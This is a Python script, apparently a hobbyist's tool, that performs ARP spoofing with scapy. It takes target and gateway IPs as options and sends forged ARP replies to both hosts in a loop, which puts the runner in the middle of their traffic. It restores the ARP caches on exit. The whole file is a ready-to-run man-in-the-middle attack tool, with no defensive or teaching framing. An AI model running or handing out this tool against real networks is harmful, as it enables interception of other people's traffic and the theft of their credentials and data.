import time
import scapy.layers.l2 as scapy
import optparse
def get_mac(target_ip):
    arp_request = scapy.ARP(pdst=target_ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # broadcast mac add is 6ff
    arp_request_broadcast = broadcast / arp_request
    # print(arp_request_broadcast.show())
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0] # 0 gives the answered and 1 gives the unanswered
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        print("\n[-] NO response from the " + str(target_ip))
        exit()
def restore (target_ip , spoof_ip):
    target_mac = get_mac(target_ip)
    spoof_mac = get_mac(spoof_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip,hwsrc=spoof_mac)
    scapy.sendp(packet,verbose = False,count = 4)
    print("[+]restoring complete....")
def spoof(target_ip , spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op = 2 , pdst= target_ip , hwdst =target_mac , psrc = spoof_ip  )
    scapy.sendp(packet,verbose = False)

def get_argument():
    parser = optparse.OptionParser()
    parser.add_option("-t","--target_ip", dest="target_ip", help="enter the target ip address")
    parser.add_option("-s","--spoof_ip", dest="spoof_ip", help="enter the spoof ip address")
    (options, arguments) = parser.parse_args()
    if not options.target_ip:
        parser.error("[-] Enter the the target ip address  --help for more information")
    elif not options.spoof_ip:
        parser.error("[-] Enter the  spoof ip address --help for more information")
    else:
        return options
options = get_argument()
count_packet =2
try:
    while True:
        spoof(options.target_ip,options.spoof_ip)
        spoof(options.spoof_ip,options.target_ip)
        time.sleep(1)
        print(" \r [+]packet sent : "+str(count_packet),end=" ")
        count_packet=count_packet+2
except KeyboardInterrupt:
    print("\n[-]keyboard interrupt  detected restoring .......")
    restore(options.target_ip,options.spoof_ip)
except Exception as e:
    print("[-]some error has occured restoring .....")
    restore(options.target_ip, options.spoof_ip)
